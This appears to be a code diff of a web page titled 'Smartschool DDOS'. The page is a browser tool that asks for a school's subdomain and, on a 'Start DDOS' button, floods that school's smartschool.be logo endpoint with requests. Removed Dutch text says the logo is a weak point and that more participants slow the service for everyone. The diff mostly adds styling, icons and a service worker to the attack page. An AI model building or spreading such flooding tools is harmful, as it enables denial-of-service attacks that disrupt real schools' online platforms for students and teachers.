@@ -1,37 +1,78 @@
 <!DOCTYPE html>
 <html>
-
+  
 <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <meta charset="utf-8" />
   <title>Smartschool DDOS</title>
   <link rel="stylesheet" href="candy.css">
+  <link rel="apple-touch-icon" href="touch-icon-iphone.png">
+<link rel="apple-touch-icon" sizes="152x152" href="touch-icon-ipad.png">
+<link rel="apple-touch-icon" sizes="180x180" href="touch-icon-iphone-retina.png">
+<link rel="apple-touch-icon" sizes="167x167" href="touch-icon-ipad-retina.png">
+
+<div class="topnav" style="
+/* From https://css.glass */
+display: flex;
+align-items: center;
+justify-content: left;
+background: rgba(255, 182, 0, 0.12);
+border-radius: 16px;
+box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+backdrop-filter: blur(7.5px);
+-webkit-backdrop-filter: blur(7.5px);
+border: 1px solid rgba(255, 182, 0, 0.33);
+">
+
+<a href="index.html"><img src="logo.png" style="width: 1vw; min-width: 70px; display: inline-block " ></a> &nbsp;
+
+&nbsp;  SmartSchool DDOS &nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp; <a href="faq.html"><button>FAQ</button></a> &nbsp;
+&nbsp; <a href="readme.html"><button>README</button></a>
+
+</div>
+
+</div>
+
+
+</div>
 </head>
 
-<body>
-  <center><img src="logo.png" style="width: 10vw; min-width: 100px;" >
- <h1 class="masthead">SmartSchool DDOS</h1> 
+<body style="background: rgb(0, 0, 0);
+background: linear-gradient(159deg, rgb(98, 0, 0) 0%, rgb(110, 75, 0) 100%);
+">
 </center>
   <h3 class="notice">
-    <p>Het zal ongeveer 2 minuten duren tot dat Smartschool niet werkt. Hoe meer mensen dit doen hoe trager SmartSchool wordt voor iedereen. Je gsm gaat een beetje traag zijn tijdens de DDOS. De "logo" van Smartschool is een zwakte punt dus daarom werkt dit.</p>
     <br>
   <br>
-  <p>DIT APP WERKT ALLEEN ALS JE OP DIT SCHERM ZIT EN MEESTAL SMARTSCHOOL LIGT PLAT ALLEEN VOOR MENSEN OP HETZELFDE NETWERK</p>
   </h3>
 <center>
   <div id="inputForm">
    <h1> <label for="schoolInput">Typ hier de naam van uw school:</label>
     <input type="text" id="schoolInput" style="height:50px;font-size:20pt;" placeholder="Naam school">
     <button id="startButton">Start DDOS</button></h1>
-   <h6> <p>Voorbeelden: <br>
-      "sjcgent" als je sjcgent.smartschool.be gebruikt <br>
-      "edugo" als je edugo.smartschool.be gebruikt <br></p></h6>
+   <h3> <p>Voorbeelden: <br>
+      "test" als je test.smartschool.be gebruikt <br>
+      "school" als je school.smartschool.be gebruikt <br></p></h3>
   </div>
 </center>
   <div id="stats">
     <!-- Stats will be displayed here -->
   </div>
 
-  <script>
+  <script>   
+  
+  if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('sw.js')
+        .then(() => {
+          console.log('Service worker registered successfully.');
+        })
+        .catch((error) => {
+          console.error('Error registering service worker:', error);
+        });
+    }
+
     var targets = {};
 
     var statsEl = document.getElementById('stats');
@@ -93,7 +134,7 @@
     startButton.addEventListener('click', function () {
       var schoolName = schoolInput.value.trim();
       if (schoolName !== '') {
-        targets['https://' + schoolName + '.smartschool.be/logo/'] = { number_of_requests: 0, number_of_errored_responses: 0 };
+        targets['https://' + schoolName + '.smartschool.be/logo'] = { number_of_requests: 0, number_of_errored_responses: 0 };
         inputForm.style.display = 'none';
         Object.keys(targets).map(flood);
       }
